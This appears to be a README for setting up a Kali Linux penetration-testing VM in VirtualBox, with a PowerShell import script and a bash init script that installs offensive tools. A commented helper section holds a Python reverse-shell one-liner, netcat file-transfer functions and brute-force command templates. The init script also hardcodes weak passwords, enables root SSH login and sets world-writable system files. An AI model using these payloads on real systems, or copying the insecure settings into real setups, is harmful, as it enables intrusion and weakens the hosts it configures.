
# Setup Kali Linux VM in Virtualbox

```markdown
> Austin.Lai |
> -----------| February 10th, 2024
> -----------| Updated on February 10th, 2024
```

---

## Table of Contents

<!-- TOC -->

- [Setup Kali Linux VM in Virtualbox](#setup-kali-linux-vm-in-virtualbox)
    - [Table of Contents](#table-of-contents)
    - [Disclaimer](#disclaimer)
    - [Description](#description)
    - [virtualbox import and modifyvm powershell script](#virtualbox-import-and-modifyvm-powershell-script)
    - [init script](#init-script)
        - [set-terminal](#set-terminal)
        - [system-update](#system-update)
        - [sshkey](#sshkey)
        - [setup](#setup)

<!-- /TOC -->

<br>

## Disclaimer

<span style="color: red; font-weight: bold;">DISCLAIMER:</span>

This project/repository is provided "as is" and without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.

This project/repository is for <span style="color: red; font-weight: bold;">Educational</span> purpose <span style="color: red; font-weight: bold;">ONLY</span>. Do not use it without permission. The usual disclaimer applies, especially the fact that me (Austin) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (data loss, system crash, system compromise, etc.) caused by the use of these programs is not Austin responsibility.

<br>

## Description

<!-- Description -->

This project/repository is a local setup of <span style="color: red; font-weight: bold;">Kali Linux VM in Virtualbox</span>.

<span style="color: orange; font-weight: bold;">Note:</span>

- The configurations in this project/repository are for your reference ONLY (the reasons are as follows):
    - The setup is hosted in <span style="color: green; font-weight: bold;">Virtual Machine</span> environment, leveraging <span style="color: green; font-weight: bold;">Virtualbox</span> on a <span style="color: green; font-weight: bold;">Windows</span> host.
    - You can download Kali Linux Virtualbox VM from [Official Kali Pre-built Virtual Machines](https://www.kali.org/get-kali/#kali-virtual-machines).
    - This setup require you to configure two network interfaces for the Kali Linux Virtualbox VM:

        1. VirtualBox Host-Only Ethernet Adapter (192.168.56.0/24)
        2. NAT

    - This setup has a `virtualbox-import-and-modifyvm` powershell script:
        - [virtualbox import and modifyvm powershell script](#virtualbox-import-and-modifyvm-powershell-script)
    - This setup has a bash script file:
[init script](#init-script)
    - Please change the configuration accordingly to suits your hosting environment.

<!-- /Description -->

<br>

## virtualbox import and modifyvm powershell script

This powershell script will extract the Kali Linux VirtualBox VM archive to the specified folder.

Then, it will change the configuration accordingly:

- Enable Hot-Pluggable HHD
- Use USB3 instead of USB1
- Enable 3D Acceleration
- Enable Remote Display Server with port 5954 and use "guest" authentication method
- Enable audio in
- Set Network Adapter 1 to "VirtualBox Host-Only Ethernet Adapter"
- Set Network Adapter 2 to "NAT"
- Enable share folder with auto-mount

The `virtualbox-import-and-modifyvm.ps1` file can be found [here](virtualbox-import-and-modifyvm.ps1) or below:

<details>

<summary><span style="padding-left:10px;">Click here to expand for the "virtualbox-import-and-modifyvm.ps1" !!!</span></summary>

```powershell
# Define paths and variables
$archivePath = "C:\kali-linux-2023.4-virtualbox-amd64.7z"
$extractedPath = "C:\virtual-machines-storage"
$vboxFilePath = "C:\virtual-machines-storage\kali-linux-2023.4-virtualbox-amd64\kali-linux-2023.4-virtualbox-amd64.vbox"

# Set VM name
$vmName = "kali-linux-2023.4-virtualbox-amd64"

# Extract the 7z archive using Bandizip CLI
bandizip.exe x -y $archivePath $extractedPath

# Register the virtual machine to VirtualBox
VBoxManage registervm "$vboxFilePath"

Start-Sleep -Seconds 2

# Attach the virtual machine to grouping
VBoxManage modifyvm $vmName --groups "/Hack_Lab/Attacker"

# Enable hot-pluggable hard disk
VBoxManage storageattach $vmName --storagectl "SATA Controller" --device 0 --port 0 --type hdd --hotpluggable on

# Select USB3 Controller
VBoxManage modifyvm $vmName --usbxhci on

# Enable 3D acceleration
VBoxManage modifyvm $vmName --accelerate3d on

# Configure remote server
VBoxManage modifyvm $vmName --vrde on
VBoxManage modifyvm $vmName --vrdeport 5954
VBoxManage modifyvm $vmName --vrdeauthtype guest
VBoxManage modifyvm $vmName --vrdemulticon on

# Enable audio input
VBoxManage modifyvm $vmName --audioin on

# Configure network adapters
VBoxManage modifyvm $vmName --nic1 hostonly --hostonlyadapter1 "VirtualBox Host-Only Ethernet Adapter"
# VBoxManage modifyvm $vmName --nic2 natnetwork --nat-network2 "$networkName"
VBoxManage modifyvm $vmName --nic2 nat 

# Enable shared folder
# VBoxManage sharedfolder add $vmName --name "virtual-machines-storage" --hostpath "$extractedPath" --automount
VBoxManage sharedfolder add $vmName --name "host-c" --hostpath "C:\" --automount
VBoxManage sharedfolder add $vmName --name "virtual-machines-storage" --hostpath "C:\virtual-machines-storage" --automount

Write-Host "Kali Linux virtual machine configuration completed."
```

</details>

<br>

## init script

This project/repository has a helper shell script with description and usage as shown below:

```
Description:
             This is an init script for setting up Kali Linux.
             Please select 'set-terminal' if you are running this for the first time.
             After successful running 'set-terminal', then run 'system-update'.
      Usage:
             ./kali-linux-virtualbox-init.sh [options]

    Options:
            -h:  Display this help message (--help, /?).
         setup:  Start the configuration.
        sshkey:  Start generate sshkey for kali and root.
  set-terminal:  This is to set qterminal (/home/kali/.config/qterminal.org/qterminal.ini) and make it immutable.
 system-update:  Doing system-update with 'apt update'.
```

The `kali-linux-virtualbox-init.sh` file can be found [here](kali-linux-virtualbox-init.sh) or below:

<details>

<summary><span style="padding-left:10px;">Click here to expand for the "kali-linux-virtualbox-init.sh" !!!</span></summary>

```bash
#!/bin/bash

# Get the current path and the filename of the script
script_file_name="$0"

# Display help message
display_help() {
  echo -e "\nDescription:"
  echo "             This is an init script for setting up Kali Linux."
  echo "             Please select 'set-terminal' if you are running this for the first time."
  echo "             After successful running 'set-terminal', then run 'system-update'."
  echo "      Usage:"
  echo -e "             $script_file_name [options]\n"
  echo "    Options:"
  echo "            -h:  Display this help message (--help, /?)."
  echo "         setup:  Start the configuration."
  echo "        sshkey:  Start generate sshkey for kali and root."
  echo "  set-terminal:  This is to set qterminal (/home/kali/.config/qterminal.org/qterminal.ini) and make it immutable."
  echo " system-update:  Doing system-update with 'apt update'."
}

# Prompt user for input
yes_or_no() {
  while true; do
    echo -e "\nYou have selected 'setup'"
    read -p "Would you like to continue? ('yes|y|Yes|Y|YES' or 'no|n|No|N|N'): " answer
    case $answer in
    [yY] | [yY][eE][sS])
      return 0
      ;;
    [nN] | [nN][oO])
      return 1
      ;;
    *)
      echo -e "\nInvalid input.\n"
      ;;
    esac
  done
}

# Check immutable attribute of a file
check_immutable_attribute() {
    if chattr -i "$1" &>/dev/null; then
        # echo "$1 is not immutable (chattr -i)."
        # echo "$1 does not have the immutable attribute (chattr +i) set."
        return 1
    else
        # echo "$1 is immutable (chattr +i)."
        # echo "$1 is set with the immutable attribute (chattr +i)."
        return 0
    fi
}

# Function to download and install a .deb package
install_deb_package() {
    local package_url="$1"
    local package_name="$2"

    echo "Downloading $package_name..."
    wget "$package_url" -O "$package_name.deb"

    if [ -e "$package_name.deb" ]; then
        echo "Installing $package_name..."
        sudo -S <<< "kali" dpkg -i "$package_name.deb"
        sudo -S <<< "kali" apt --fix-broken install -y
        rm "$package_name.deb"
        echo "$package_name installed successfully."
    else
        echo "Failed to download $package_name."
    fi
}

# Function to check the content of a file
check_file_content() {
  file="$1"
  content="$2"
  found=false

  for attempt in 1 2; do
    if ! grep -q "$content" "$file"; then
      if [ $attempt -eq 1 ]; then
        echo "Content not found in $file. You MUST close qterminal and open a new one again..."
      else
        echo "Content not found in $file on the second attempt. You MUST do a \"echo \"kali\" sudo reboot\"..."
        exit 1
      fi
    else
      found=true
      break  # Content found, break out of the loop
    fi
  done

  if [ "$found" = true ]; then
    echo "Content found in $file."
  fi
}

# Check if exactly one argument is provided
if [ "$#" -ne 1 ]; then
  display_help
  exit 1
fi

# Check for command line arguments
if [ -z "$1" ]; then
  arg1="-h"
else
  arg1="$1"
fi

# Display help message
if [ "$arg1" = "/?" ] || [ "$arg1" = "-h" ] || [ "$arg1" = "--help" ]; then
  display_help
  exit 0
fi

# Capture Ctrl+C and exit
trap "exit 1" INT

# Get the current date in the format DDMMYYYY
current_date=$(date +'%d%m%Y-%H%M')

# Store the argument
argument="$1"

# Store the argument as option
option=""

# Check the argument against the allowed options
case "$argument" in
    "/?" | "-h" | "--help")
        display_help
        ;;
    "setup")
        option="setup"
        ;;
    "sshkey")
        option="sshkey"
        ;;
    "system-update")
        option="system-update"
        ;;
    "set-terminal")
        option="set-terminal"
        ;;
    *)
        echo -e "\nInvalid option: $argument"
        display_help
        exit 1
        ;;
esac

# Continue the script based on the option
if [[ "$option" == "setup" ]]; then

    # Define the filename with the current date
    output_file="setup-$current_date.log"

    {
      # Turn on debugging mode
      set -xv

      # setterm -foreground white -background blue
      # setterm -store

      shopt -s extglob
      shopt -s cdspell
      shopt -s direxpand
      shopt -s dirspell
      shopt -s dotglob
      shopt -s histappend
      shopt -s globstar
      shopt -s nullglob

      # Call function to prompt user for input and continue setup configuration if user enters 'yes'
      if yes_or_no; then

        echo -e "\nTesting setup configuration...\n"

        # Set hostname
        sudo -S <<< "kali" hostnamectl set-hostname kali-Virtualbox

        # Set timezone
        sudo -S <<< "kali" timedatectl set-timezone Asia/Singapore

        # Set host-only network with static IP in /etc/network/interfaces
        if grep -q "iface eth1 inet static" /etc/network/interfaces; then
          # The string "iface eth1 inet static" was found in the file
          echo -e "The string \"iface eth1 inet static\" was found in the file.\n"
        else
          # The string was not found in the file
          echo -e "The string \"iface eth1 inet static\" was NOT found in the file.\n"
          
          # Backup /etc/network/interfaces
          sudo -S <<< "kali" cp -v /etc/network/interfaces /home/kali/Desktop/interfaces.$current_date.bak
          sudo -S <<< "kali" chmod 777 /home/kali/Desktop/interfaces.$current_date.bak
          
          { echo "kali"; echo ""; } | sudo -k -S tee -a /etc/network/interfaces &>/dev/null
          { echo "kali"; echo "auto eth1"; } | sudo -k -S tee -a /etc/network/interfaces &>/dev/null
          { echo "kali"; echo "iface eth1 inet static"; } | sudo -k -S tee -a /etc/network/interfaces &>/dev/null
          { echo "kali"; echo "    address 192.168.138.6"; } | sudo -k -S tee -a /etc/network/interfaces &>/dev/null
          { echo "kali"; echo "    netmask 255.255.255.0"; } | sudo -k -S tee -a /etc/network/interfaces &>/dev/null
          sudo -S <<< "kali" chmod 777 /etc/network/interfaces
          sleep 2
          sudo -S <<< "kali" systemctl restart networking
          sleep 2
          sudo -S <<< "kali" ip a | grep -A 10 eth1
        fi

        # Set root password
        { echo "root"; echo "root"; } | sudo -S passwd root &>/dev/null

        # Edit /etc/hosts with hostname
        if grep -q "kali-Virtualbox" /etc/hosts; then
          # The string "kali-Virtualbox" was found in the file
          echo -e "The string \"kali-Virtualbox\" was found in the file.\n"
        else
          # The string was not found in the file
          echo -e "The string \"kali-Virtualbox\" was NOT found in the file.\n"
          
          # Backup /etc/hosts
          sudo -S <<< "kali" cp -v /etc/hosts /etc/hosts.$current_date.bak
          sudo -S <<< "kali" chmod 777 /etc/hosts.$current_date.bak

          # Edit /etc/hosts with hostname
          sudo -S <<< "kali" sed -i.bak '/127.0.0.1\s*localhost/i 127.0.0.1       kali-Virtualbox' /etc/hosts
          sudo -S <<< "kali" sed -i.bak '/127.0.0.1\s*kali-Virtualbox/i 192.168.138.6   kali-Virtualbox' /etc/hosts
          sudo -S <<< "kali" chmod 777 /etc/hosts
          sudo -S <<< "kali" cat /etc/hosts
        fi

        # Update apt
        sudo -S <<< "kali" apt update -y

        # Install rust
        # echo "kali" | sudo -S curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
        # sleep 2
        # rustup update
        # sleep 2
        sudo -S <<< "kali" apt install -y cargo zsh
      
        sleep 2
        setopt CORRECT
        setopt ALL_EXPORT
        setopt autocd
        setopt interactivecomments
        setopt magicequalsubst
        setopt notify
        setopt promptsubst
        
        sleep 2
        chsh -s $(which zsh)

        # Install starship prompt
        echo "kali" | sudo -S curl -sS https://starship.rs/install.sh | sh -s -- -y
        sleep 2

        # Install basic tools
        sudo -S <<< "kali" apt install -y zsh-autosuggestions dos2unix python3 tmux asciinema golang sshuttle neofetch zsh git software-properties-common powershell nmap ltrace lsof strace tshark tcpdump exiftool rpm man-db upx-ucl nfs-common cifs-utils rdesktop ncat netcat-traditional wfuzz sqlmap dnsenum enum4linux nikto nbtscan-unixwiz smbmap linux-exploit-suggester exploitdb binwalk sshuttle john hydra wordlists sshpass jq openssl morse hashid 2to3 mcrypt bsdgames morse2ascii seclists curl feroxbuster impacket-scripts onesixtyone oscanner redis-tools smbclient sslscan tnscmd10g whatweb wkhtmltopdf ffuf gobuster gcc gpg ripgrep fd-find screen powershell-empire starkiller feroxbuster netcat-openbsd metasploit-framework armitage koadic mingw-w64 freerdp2-shadow-x11 freerdp2-x11 snapd remmina ruby evil-winrm feroxbuster shellter evilginx2 chisel burpsuite
        sleep 2

        # Install sliver c2
        sudo -S <<< "kali" apt install -y sliver

        # Install rustscan
        cargo install rustscan
        sleep 2
        cargo install eza
        sleep 2

        # Install fast-syntax-highlighting and zsh-autocomplete
        git clone https://github.com/zdharma-continuum/fast-syntax-highlighting /home/kali/.config/fast-syntax-highlighting
        git clone --depth 1 -- https://github.com/marlonrichert/zsh-autocomplete.git /home/kali/.config/zsh-autocomplete

        # Install fonts-cascadia-code and FiraCode Nerd Font
        echo "Downloading CascadiaCode Nerd Font..."
        wget https://github.com/microsoft/cascadia-code/releases/download/v2105.24/CascadiaCode-2105.24.zip
        
        echo "Downloading FiraCode Nerd Font..."
        wget https://github.com/ryanoasis/nerd-fonts/releases/download/v2.1.0/FiraCode.zip

        # Unzip the downloaded font
        unzip CascadiaCode-2105.24.zip
        sudo -S <<< "kali" unzip FiraCode.zip -d /usr/share/fonts/truetype/
        
        sudo -S <<< "kali" cp -v ttf/CascadiaCodePL.ttf /usr/share/fonts/truetype/

        # Update the system's font cache
        sudo -S <<< "kali" fc-cache -f -v

        # Cleanup
        rm -f CascadiaCode-2105.24.zip
        rm -f FiraCode.zip
        rm -rf otf ttf woff2
        rm -f wget-log

        # Install VSCODE Version 1.83
        vscode_url="https://go.microsoft.com/fwlink/?LinkID=760868"
        install_deb_package "$vscode_url" "vscode"

        # Install Google Chrome
        google_chrome_url="https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb"
        install_deb_package "$google_chrome_url" "google-chrome"

        # Install Microsoft Edge
        edge_url="https://packages.microsoft.com/repos/edge/pool/main/m/microsoft-edge-stable/microsoft-edge-stable_118.0.2088.46-1_amd64.deb?brand=M102"
        install_deb_package "$edge_url" "microsoft-edge"

        # missing owasp-zap
        echo -e "\nmissing owasp-zap"

        # missing powershell-for-pentesters # git clone https://github.com/dievus/PowerShellForPentesters
        echo -e "\nmissing powershell-for-pentesters \ngit clone https://github.com/dievus/PowerShellForPentesters"

        # missing powershell-suite # git clone https://github.com/FuzzySecurity/PowerShell-Suite.git
        echo -e "\nmissing powershell-suite \ngit clone https://github.com/FuzzySecurity/PowerShell-Suite.git"

        # missing webserver # git clone https://github.com/MScholtes/WebServer.git
        echo -e "\nmissing webserver \ngit clone https://github.com/MScholtes/WebServer.git"

        # missing ssh-backdoor # git clone https://github.com/NinjaJc01/ssh-backdoor.git
        echo -e "\nmissing ssh-backdoor \ngit clone https://github.com/NinjaJc01/ssh-backdoor.git"

        # missing jwt_tool # git clone https://github.com/ticarpi/jwt_tool
        echo -e "\nmissing jwt_tool \ngit clone https://github.com/ticarpi/jwt_tool"

        # Install and setup pipx
        python3 -m pip install --user pipx termcolor cprint pycryptodomex requests
        python3 -m pipx ensurepath
        pipx ensurepath

        # Install tools using pipx
        pipx install crackmapexec
        pipx ensurepath

        # Install tools using pip3
        pip3 install updog
        pip3 install kerbrute
        pip3 install name-that-hash
        pip3 install qu1ckdr0p2

        # Install kerbrute using Go
        go install github.com/ropnop/kerbrute@latest

        # Update databases for nmap, wpscan, searchsploit, and locate
        sudo -S <<< "kali" nmap --script-updatedb
        sudo -S <<< "kali" wpscan --update
        sudo -S <<< "kali" searchsploit -u
        sudo -S <<< "kali" updatedb

        # Upgrade apt
        sudo -S <<< "kali" apt full-upgrade -y
        sleep 2

        # Autoremove apt and purge
        sudo -S <<< "kali" apt autoremove --purge -y && sudo apt autoclean -y

        # Enable SSH at boot and allow root login with SSH
        sudo -S <<< "kali" systemctl enable ssh.service
        sudo -S <<< "kali" sed -i.bak 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
        sudo -S <<< "kali" sed -i.bak 's/#PubkeyAuthentication yes/PubkeyAuthentication yes/' /etc/ssh/sshd_config
        sudo -S <<< "kali" systemctl restart ssh.service

        # Backup /home/kali/.zshrc
        cp -v /home/kali/.zshrc /home/kali/.zshrc.$current_date.bak
        
        echo -e '\neval "$(starship init zsh)"' >> /home/kali/.zshrc
        echo -e '\nexport PATH="$PATH:/home/kali/.cargo/bin"' >> /home/kali/.zshrc

        # Check the content of /home/kali/.zshrc 
        echo ""
        cat /home/kali/.zshrc
        echo ""

        echo -e "\nHISTSIZE=9999\nSAVEHIST=9999\n\nalias nc.tra=/usr/bin/nc.traditional\nalias nc.bsd=/usr/bin/nc.openbsd\nalias screenrec=\"asciinema rec --stdin -i 1 ./\$(date +\"%F_%T_%z\").cast\"\nalias kali_desktop=\"cd /home/kali/Desktop\"\nalias root_desktop=\"cd /root\"\n\nsource ~/.config/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh\n\nsource ~/.config/zsh-autocomplete/zsh-autocomplete.plugin.zsh\n\nexport STARSHIP_CONFIG=~/.config/pastel-powerline.toml\n\n" >> /home/kali/.zshrc

        # Check the content of /home/kali/.zshrc
        echo ""
        cat /home/kali/.zshrc
        echo ""

        echo -e 'source ~/kali-linux-Virtualbox-zsh.sh' >> /home/kali.zshrc

        # Check the content of /home/kali/.zshrc
        echo ""
        cat /home/kali/.zshrc
        echo ""

        echo -e "set -g mouse on\n# sane scrolling:\nbind -n WheelUpPane if-shell -F -t = \"#{mouse_any_flag}\" \"send-keys -M\" \"if -Ft= '#{pane_in_mode}' 'send-keys -M' 'copy-mode -e; send-keys -M'\"" >> /home/kali/.tmux.conf

        # Check the content of /home/kali/.tmux.conf
        echo ""
        cat /home/kali/.tmux.conf
        echo ""

        



        echo -e "\n !!! MANUALLY COPY THE BELOW TO /home/kali/kali-linux-Virtualbox-zsh.sh !!! \n"
        #########################################################################################
        # /home/kali/kali-linux-Virtualbox-zsh.sh
        # MANUALLY COPY THE BELOW TO /home/kali/kali-linux-Virtualbox-zsh.sh
        #########################################################################################
        #!/bin/bash

        # fake_sshkey() {
        #     echo -e "\n ssh-keygen -t rsa -f fake.id_rsa -P '' ; cat fake.id_rsa.pub \n"

        #     default_fileName="fake"

        #     echo -n "Specify filename or press Enter to use default filename ($default_fileName): "

        #     read fileName

        #     if [ -z "$fileName" ]; then
        #         fileName=$default_fileName
        #     fi

        #     ssh-keygen -t rsa -f "${fileName}.id_rsa" -P ""

        #     echo -e " \n "

        #     cat "${fileName}.id_rsa.pub"
        # }



        # ffuf_command() {

        #     ls -lah /usr/share/wordlists

        #     echo -e "\n ffuf -u http://\$1 -w \"/usr/share/wordlists\" -c -v -t 50 -od . -of md -o ffuf-\$3.md \$* \n"
        # }



        # thm_ffuf() {

        #     ls -lah /usr/share/wordlists

        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target

        #     echo -n "Specify output filename (e.g., IP/FQDN): "
        #     read filename

        #     echo -n "Specify wordlist: "
        #     read wordlist

        #     ffuf -u "http://$target" -w "$wordlist" -c -v -t 50 -od . -of md -o "${filename}.thm-ffuf.md"
        # }



        # ffuf_vhost_command() {

        #     ls -lah /usr/share/wordlists

        #     echo -e "\n ffuf -w \"/usr/share/wordlists\" -u http://forge.htb/ -H 'Host: FUZZ.forge.htb' -t 200 -fl 10 -c -od . -of md -o ffuf-vhost-forge.htb.md \n"
        # }



        # find_suid() {
        #     echo -e "\n find / -type f -perm -04000 -ls >> '$(whoami)-find-suid.txt' 2>/dev/null \n"
        # }



        # gobuster_command() {
            
        #     ls -lah /usr/share/wordlists

        #     echo -e "\n gobuster -t 45 --delay 100ms dir -e -u \"http://$one\" -o \"gobuster-dir-$two\" -w \"/usr/share/wordlists\" \n"
        # }



        # gobuster_dir() {
            
        #     ls -lah /usr/share/wordlists

        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target

        #     echo -n "Specify output filename (e.g., IP/FQDN): "
        #     read filename

        #     echo -n "Specify wordlist: "
        #     read wordlist

        #     gobuster -t 45 --delay 100ms dir -e -u "http://$target" -o "$filename.gobuster-dir" -w "$wordlist"
        # }



        # hash_id() {
        #     echo -e "\n nth -a | ev -t | -f hash  ---OR--- hashid -ejm hash \n"
        # }



        # hydra_command() {
        #     echo " hydra -s port -o hydra-output -VV -t 60 -f -l lin -P locks.txt 10.10.155.24 ssh "
        # }



        # john_command() {
                
        #     ls -lah /usr/share/wordlists

        #     echo -e "\n john --format=NT -w rockyou.lst hash.txt --pot=output.txt \n"
        # }



        # john_result() {
        #     echo -e "\n john --show hash \n"
        # }



        # nc_recv() {
        #     echo -e "\n nc -nlvvp 9998 > \$* \n"
        # }



        # nc_send() {
        #     echo -e "\n nc -vv \$1 9998 < \$2 \$* \n"
        # }



        # nc17777() {
        #     arguments="-lnvvp 17777"
        #     nc ${arguments}
        # }



        # nc17778() {
        #     arguments="-lnvvp 17778"
        #     nc ${arguments}
        # }



        # nc18888() {
        #     arguments="-lnvvp 18888"
        #     nc ${arguments}
        # }



        # nc18889() {
        #     arguments="-lnvvp 18889"
        #     nc ${arguments}
        # }



        # nc19998recv() {
        #     port=19998

        #     echo -n "Enter the targeted filename: "
        #     read fileName

        #     nc -w 30 -nlvvp $port > $fileName
        # }



        # nc19998send() {
        #     port=19998

        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target_IP

        #     echo -n "Enter the source filename: "
        #     read fileName

        #     cat ${fileName} | nc -w 30 -vv ${target_IP} ${port}
        # }



        # nc19999recv() {
        #     port=19999

        #     echo -n "Enter the targeted filename: "
        #     read fileName

        #     nc -w 30 -nlvvp $port > $fileName
        # }



        # nc19999send() {
        #     port=19999

        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target_IP
            
        #     echo -n "Enter the source filename: "
        #     read fileName

        #     cat $fileName | nc -w 30 -vv $target_IP $port
        # }



        # new_sshkey() {
            
        #     echo -n "Enter the source filename: "
        #     read fileName

        #     ssh-keygen -o -v -t ed25519 -a 1000 -f "${fileName}.id_rsa" -P ""
        # }



        # nikto_command() {
        #     echo -e "\n nikto -h devzat.htb -p 80 -o nikto-result-devzat.htb -Format txt -Display V \n"
        # }



        # nmap_output() {
        #     echo -e "\n -oN nmap-full-safe-scan-\$1 \$2 \$* \n"
        # }



        # nmap_fast_3000() {
            
        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target
            
        #     echo -n "Specify output filename (e.g., IP/FQDN): "
        #     read filename

        #     nmap -n --privileged --stats-every 25s -vvvvvv -Pn -F --top-ports 3000 -r -sV -O --version-light -T4 --min-parallelism 30 --min-rate 300 --reason --append-output -oN "${filename}.nmap-fast-3000" $target
        # }



        # nmap_fast_port() {
            
        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target
            
        #     echo -n "Specify output filename (e.g., IP/FQDN): "
        #     read filename

        #     nmap -n --privileged --stats-every 25s -vvvvvv -Pn -p- -r -sV -O --version-light -T4 --min-parallelism 30 --min-rate 300 --reason --append-output -oN "${filename}.nmap-fast-port" $target
        # }



        # nmap_full_max() {
            
        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target
            
        #     echo -n "Specify output filename (e.g., IP/FQDN): "
        #     read filename

        #     nmap -n --privileged --stats-every 15s -vvvvvv -Pn -p- -r -A -sCSV -O --version-all -T4 --max-parallelism 30 --max-rate 300 --reason --script=safe,default,discovery,version,vuln --append-output -oN "${filename}.nmap-full-max" $target
        # }



        # nmap_full_min() {
            
        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target
            
        #     echo -n "Specify output filename (e.g., IP/FQDN): "
        #     read filename

        #     nmap -n --privileged --stats-every 15s -vvvvvv -Pn -p- -r -A -sCSV -O --version-all -T4 --min-parallelism 30 --min-rate 300 --reason --script=safe,default,discovery,version,vuln --append-output -oN "${filename}.nmap-full-min" $target
        # }



        # nmap_full_no_script() {
            
        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target
            
        #     echo -n "Specify output filename (e.g., IP/FQDN): "
        #     read filename

        #     nmap -n --privileged --stats-every 15s -vvvvvv -Pn -p- -r -A -sCSV -O --version-all -T4 --min-parallelism 30 --min-rate 300 --reason --append-output -oN "${filename}.nmap-full-no-script" $target
        # }



        # nmap_open() {
            
        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target
            
        #     echo -n "Specify output filename (e.g., IP/FQDN): "
        #     read filename

        #     nmap -n --privileged --stats-every 15s -vvvvvv -Pn -p- -r -open --append-output -oN "${filename}.nmap-open" $target
        # }



        # nmap_ping() {
            
        #     echo -n "Specify target (e.g., IP/FQDN): "
        #     read target
            
        #     echo -n "Specify output filename (e.g., IP/FQDN): "
        #     read filename

        #     nmap -n --privileged --stats-every 15s -vvvvvv -sn --append-output -oN "${filename}.nmap-ping" $target
        # }



        # password_list() {
        #     ls -lah /usr/share/wordlists
        # }



        # python_web() {
        #     echo -n "Enter the port: "
        #     read Port
        #     python3 -m http.server $Port
        # }



        # python3_reverse_shell() {
        #     echo -e "\n /usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.4.2.85\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' \n"
        # }



        # readme() {
        #     code -n ./README.md
        # }



        # rustscan_command() {
        #   echo -e "\n rustscan -u 5000 -b 1900 -t 4000 --tries 2 --scan-order serial -a 192.168.0.1 -- -Pn -A -sVC --script=safe,default,discovery,version,vuln | tee rustscan-full-result-NAME \n"
        # }



        # rustscan_simple() {
        #   echo -e "\n rustscan -u 5000 -b 1900 -t 4000 --tries 2 --scan-order serial -a 10.10.32.200 -- -Pn -sV --script=version | tee rustscan-simple-result-NAME \n"
        # }



        # sqlmap_command() {
        #   echo -e "\n sqlmap -u http://10.10.166.239/login.php --forms --data=\"user=^&password=^&s=Submit\" --risk=3 --level=5 --dbs --method POST -o --batch -v 1 --eta --threads=10 --schema --exclude-sysdbs \n"
        # }



        # sshkey_remove() {
        #     echo -n "Enter the IP/Hostname to be removed: "
        #     read STRINGS
        #     ssh-keygen -R $STRINGS
        # }



        # wget_command() {
        #     echo -e "\n wget -r -np -R \"index.html*\" WEB_PATH \n"
        # }



        # wget_recursive() {
        #     echo -n "Enter the URL: "
        #     read STRINGS
        #     wget -r -np -R "index.html*" $STRINGS
        # }



        # wordlist() {
        #     ls -lah /usr/share/wordlists
        # }

        # You can add more functions as needed
        #########################################################################################

        # Check the content of /home/kali/kali-linux-Virtualbox-zsh.sh
        # echo ""
        # cat /home/kali/kali-linux-Virtualbox-zsh.sh
        # echo ""





        echo -e "\n !!! MANUALLY COPY THE BELOW TO /home/kali/.config/pastel-powerline.toml !!! \n"
        #########################################################################################
        # /home/kali/.config/pastel-powerline.toml
        # MANUALLY COPY THE BELOW TO /home/kali/.config/pastel-powerline.toml
        #########################################################################################
        # # Get editor completions based on the config schema
        # "$schema" = 'https://starship.rs/config-schema.json'

        # # Inserts a blank line between shell prompts
        # add_newline = true

        # # A continuation prompt that displays two filled in arrows
        # continuation_prompt = "▶▶"

        # # Wait 10 milliseconds for starship to check files under the current directory.
        # scan_timeout = 10

        # # Set 'austin' as custom color palette
        # palette = 'austin'

        # format = """$time$username $fill$cmd_duration$status
        # $directory
        # $os$shell$character"""

        # # Disable the package module, hiding it from the prompt completely
        # [package]
        # disabled = true

        # [line_break]
        # disabled = false

        # # Define custom colors
        # [palettes.austin]
        # # Overwrite existing color
        # # blue = '#39FF14'
        # # Define new color
        # # mustard = '#af8700'
        # neon_green = '#39FF14'

        # [os]
        # # format = " $symbol "
        # format = "[ $symbol ]($style)"
        # style = "bold white"
        # # style = "bg:#f07623"
        # disabled = false

        # # This is the default symbols table.
        # [os.symbols]
        # Alpaquita = "🔔"
        # Alpine = "🏔️"
        # Amazon = "🙂"
        # Android = "🤖"
        # Arch = "🎗️"
        # Artix = "🎗️"
        # CentOS = "💠"
        # Debian = "🌀"
        # DragonFly = "🐉"
        # Emscripten = "🔗"
        # EndeavourOS = "🚀"
        # Fedora = "🎩"
        # FreeBSD = "😈"
        # Garuda = "🦅"
        # Gentoo = "🗜️"
        # HardenedBSD = "🛡️"
        # Illumos = "🐦"
        # Linux = "🐧"
        # Mabox = "📦"
        # Macos = "🍎"
        # Manjaro = "🥭"
        # Mariner = "🌊"
        # MidnightBSD = "🌘"
        # Mint = "🌿"
        # NetBSD = "🚩"
        # NixOS = "❄️"
        # OpenBSD = "🐡"
        # OpenCloudOS = "☁️"
        # openEuler = "🦉"
        # openSUSE = "🦎"
        # OracleLinux = "🦴"
        # Pop = "🍭"
        # Raspbian = "🍓"
        # Redhat = "🎩"
        # RedHatEnterprise = "🎩"
        # Redox = "🧪"
        # Solus = "⛵"
        # SUSE = "🦎"
        # Ubuntu = "🎯"
        # Unknown = "❓"
        # # Windows = "🪟"
        # Windows = ""

        # # You can also replace your username with a neat symbol like  to save some space
        # [username]
        # show_always = true
        # format = '[ \[$user\] ]($style)'
        # # style_user = "bg:#9A348E"
        # # style_root = "bg:#9A348E fg:red"
